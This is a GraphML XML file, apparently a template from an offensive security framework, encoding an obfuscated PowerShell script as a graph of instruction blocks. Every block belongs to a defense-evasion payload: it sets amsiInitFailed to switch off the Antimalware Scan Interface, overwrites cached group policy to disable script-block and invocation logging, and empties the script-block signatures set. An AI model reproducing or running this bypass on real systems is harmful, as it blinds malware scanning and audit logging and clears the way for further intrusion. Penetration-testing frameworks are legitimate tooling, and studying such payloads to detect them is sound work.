<?xml version="1.0" ?>
<!--
  This file was generated by hand since no automated analysis and generation tool currently exists for Powershell code.
-->
<graphml xmlns="http://graphml.graphdrawing.org/xmlns" xmlns:xsi="http://graphml.graphdrawing.org/xmlns" xsi:schemaLocation="http://graphml.graphdrawing.org/xmlns http://graphml.graphdrawing.org/xmlns/1.0/graphml.xsd">
  <key id="address" for="all" attr.name="address" attr.type="long"/>
  <key id="type" for="all" attr.name="type" attr.type="string"/>
  <key id="instruction.source" for="node" attr.name="instruction.source" attr.type="string"/>
  <key id="instruction.hex" for="node" attr.name="instruction.hex" attr.type="string"/>
  <graph edgedefault="directed">
    <node id="block.0">
      <data key="address">1</data>
      <data key="type">block</data>
      <graph edgedefault="directed">
        <data key="address">1</data>
        <data key="type">block</data>
        <node id="block.0:instruction.1">
          <data key="address">2</data>
          <data key="type">instruction</data>
          <data key="instruction.source">If($PSVersionTable.PSVersion.Major -lt 3){Exit}</data>
        </node>
      </graph>
    </node>
    <node id="block.1">
      <data key="address">1</data>
      <data key="type">block</data>
      <graph edgedefault="directed">
        <data key="address">1</data>
        <data key="type">block</data>
        <node id="block.1:instruction.1">
          <data key="address">1</data>
          <data key="type">instruction</data>
          <data key="instruction.source">$val=[Collections.Generic.Dictionary[string,System.Object]]::new();</data>
        </node>
        <node id="block.1:instruction.2">
          <data key="address">2</data>
          <data key="type">instruction</data>
          <data key="instruction.source">$Ref1=[Ref].Assembly.GetType(&lt;%= Rex::Powershell::Obfu.scate_string_literal('System.Management.Automation.AmsiUtils', threshold: 0.3) %&gt;);</data>
        </node>
        <node id="block.1:instruction.3">
          <data key="address">3</data>
          <data key="type">instruction</data>
          <data key="instruction.source">If($Ref1) { $Ref1.GetField(&lt;%= Rex::Powershell::Obfu.scate_string_literal('amsiInitFailed', threshold: 1) %&gt;,'NonPublic,Static').SetValue($null,$true); }</data>
        </node>
        <node id="block.1:instruction.4">
          <data key="address">4</data>
          <data key="type">instruction</data>
          <data key="instruction.source">$Ref2=[Ref].Assembly.GetType(&lt;%= Rex::Powershell::Obfu.scate_string_literal('System.Management.Automation.Utils') %&gt;);</data>
        </node>
        <node id="block.1:instruction.5">
          <data key="address">5</data>
          <data key="type">instruction</data>
          <data key="instruction.source">$GPF=$Ref2.GetField('cachedGroupPolicySettings','NonPublic,Static');</data>
        </node>
        <node id="block.1:instruction.6">
          <data key="address">6</data>
          <data key="type">instruction</data>
          <data key="instruction.source">$SBL=&lt;%= Rex::Powershell::Obfu.scate_string_literal('ScriptBlockLogging') %&gt;;</data>
        </node>
        <node id="block.1:instruction.7">
          <data key="address">7</data>
          <data key="type">instruction</data>
          <data key="instruction.source">$EnableSBL=&lt;%= Rex::Powershell::Obfu.scate_string_literal('EnableScriptBlockLogging') %&gt;;</data>
        </node>
        <node id="block.1:instruction.8">
          <data key="address">8</data>
          <data key="type">instruction</data>
          <data key="instruction.source">$EnableSBIL=&lt;%= Rex::Powershell::Obfu.scate_string_literal('EnableScriptBlockInvocationLogging') %&gt;;</data>
        </node>
        <node id="block.1:instruction.9">
          <data key="address">9</data>
          <data key="type">instruction</data>
          <data key="instruction.source">If($GPF) { $GPC=$GPF.GetValue($null); }</data>
        </node>
        <edge source="block.1:instruction.2" target="block.1:instruction.3"/>
        <edge source="block.1:instruction.3" target="block.1:instruction.9"/>
        <edge source="block.1:instruction.4" target="block.1:instruction.5"/>
        <edge source="block.1:instruction.5" target="block.1:instruction.9"/>
      </graph>
    </node>
    <node id="block.2">
      <data key="address">10</data>
      <data key="type">block</data>
      <graph edgedefault="directed">
        <data key="address">10</data>
        <data key="type">block</data>
        <node id="block.2:instruction.1">
          <data key="address">10</data>
          <data key="type">instruction</data>
          <data key="instruction.source">If($GPF -And $GPC[$SBL]) { $GPC[$SBL][$EnableSBL]=0; }</data>
        </node>
        <node id="block.2:instruction.2">
          <data key="address">11</data>
          <data key="type">instruction</data>
          <data key="instruction.source">If($GPF -And $GPC[$SBL]) { $GPC[$SBL][$EnableSBIL]=0; }</data>
        </node>
      </graph>
    </node>
    <node id="block.3">
      <data key="address">12</data>
      <data key="type">block</data>
      <graph edgedefault="directed">
        <data key="address">12</data>
        <data key="type">block</data>
        <node id="block.3:instruction.1">
          <data key="address">12</data>
          <data key="type">instruction</data>
          <data key="instruction.source">If($GPF) { $val.Add($EnableSBL,0); }</data>
        </node>
        <node id="block.3:instruction.2">
          <data key="address">13</data>
          <data key="type">instruction</data>
          <data key="instruction.source">If($GPF) { $val.Add($EnableSBIL,0); }</data>
        </node>
        <node id="block.3:instruction.3">
          <data key="address">14</data>
          <data key="type">instruction</data>
          <data key="instruction.source">If($GPF) { $GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\'+$SBL]=$val; }</data>
        </node>
        <edge source="block.3:instruction.1" target="block.3:instruction.3"/>
        <edge source="block.3:instruction.2" target="block.3:instruction.3"/>
      </graph>
    </node>
    <node id="block.4">
      <data key="address">15</data>
      <data key="type">block</data>
      <graph edgedefault="directed">
        <data key="address">15</data>
        <data key="type">block</data>
        <node id="block.4:instruction.1">
          <data key="address">15</data>
          <data key="type">instruction</data>
          <data key="instruction.source">If(!$GPF) { [Ref].Assembly.GetType(&lt;%= Rex::Powershell::Obfu.scate_string_literal('System.Management.Automation.ScriptBlock') %&gt;).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }</data>
        </node>
      </graph>
    </node>
    <edge source="block.0" target="block.1"/>
    <edge source="block.1" target="block.2"/>
    <edge source="block.1" target="block.3"/>
    <edge source="block.2" target="block.4"/>
    <edge source="block.3" target="block.4"/>
  </graph>
</graphml>
